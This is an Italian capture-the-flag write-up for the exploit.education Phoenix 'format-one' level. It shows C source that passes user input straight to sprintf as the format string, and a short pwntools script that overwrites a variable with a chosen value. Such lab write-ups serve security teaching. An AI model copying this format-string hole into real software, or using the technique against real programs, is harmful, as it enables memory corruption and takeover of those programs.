### Descrizione del Codice

Il programma `format_one.c` introduce la possibilità di scrivere in aree specifiche della memoria per modificare l'esecuzione del programma.

### Funzionamento del Programma

1. Il programma legge un input dall'utente e lo memorizza in `buffer`.
2. Copia il contenuto di `buffer` in `locals.dest` usando `sprintf`.
3. Controlla se la variabile `changeme` è stata impostata al valore specifico `0x45764f6c`.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `sprintf` con un input controllato dall'utente senza specificare un formato, il che può causare una vulnerabilità di formato. Questo può essere sfruttato per scrivere un valore specifico nella variabile `changeme`.

### Exploit

L'exploit sfrutta la vulnerabilità di formato per scrivere il valore `0x45764f6c` nella variabile `changeme`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0x45764f6c) {
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
        locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }

  exit(0);
}

Questo livello è simile al precedente, tranne che dobbiamo impostare changeme a un valore specifico 0x45764f6c invece di un valore casuale.

Soluzione
# solve.py

from pwn import *

buff = ""
buff += '%32x'
buff += p64(0x45764f6c)

print(buff)

Eseguiamo:
$ python solve.py | /opt/phoenix/amd64/format-one